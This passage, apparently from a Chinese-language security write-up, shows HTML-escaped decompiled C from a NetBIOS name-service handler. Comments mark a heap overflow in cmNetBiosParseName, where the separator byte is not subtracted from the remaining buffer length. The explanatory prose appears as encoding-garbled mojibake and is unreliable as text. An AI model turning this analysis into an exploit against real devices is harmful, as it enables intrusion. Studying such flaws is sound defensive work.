  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//---- [1]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//heap overflow at netbios_ns_buffer  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getname_query_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNamePositiveRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndExternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_17:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú®‰∏äËø∞Á®ãÂºèÁ¢º&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; ‰∏≠ÔºåË©≤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; ÂáΩÂºèÔºåÊúÉÂéªËôïÁêÜ Question Ê¨Ñ‰Ωç‰∏≠ÁöÑÂêçÁ®±Ôºå‰πüÊèê‰æõ‰∫Ü buffer Â§ßÂ∞èÁµ¶Ë©≤ÂáΩÂºèÔºåÁÑ∂ËÄåË©≤ÂáΩÂºè‰∏¶Ê≤íÊúâÊ≠£Á¢∫Ê™¢Êü•Èï∑Â∫¶ÔºåÂ∞éËá¥Ë§áË£ΩÈÅéÂ§öÁöÑË≥áÊñôÂà∞ netbios_ns_buff Â∞éËá¥ heap overflow&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰æÜÁúã‰∏Ä‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; ÂáΩÂºè&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-24h] BYREF&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;maxlan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ---------- [2]              // it does not subtract the length of &quot;.&quot;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
